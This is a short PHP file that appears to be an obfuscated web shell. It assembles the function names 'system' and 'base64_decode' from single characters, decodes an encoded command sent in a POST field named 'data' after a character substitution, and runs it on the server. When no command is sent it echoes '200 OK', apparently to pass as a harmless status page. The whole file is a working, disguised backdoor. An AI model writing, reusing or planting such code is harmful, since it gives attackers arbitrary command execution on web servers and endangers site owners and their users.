<?php
$GLOBALS['x1'] = 's'.'y'.'s'.'t'.'e'.'m';
$GLOBALS['x2'] = 'd'.'a'.'t'.'a';
$GLOBALS['x3'] = array("|"=>"a","!"=>"b","@"=>"c","_"=>"d","~"=>"=");
$GLOBALS['x4'] = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';

if(isset($_POST[$GLOBALS['x2']])){
    $d = $_POST[$GLOBALS['x2']];
    $r = strtr($d, $GLOBALS['x3']);
    $c = $GLOBALS['x4']($r);
    $f = $GLOBALS['x1'];
    $f($c);
}else{
    echo "200 OK";
}
?>
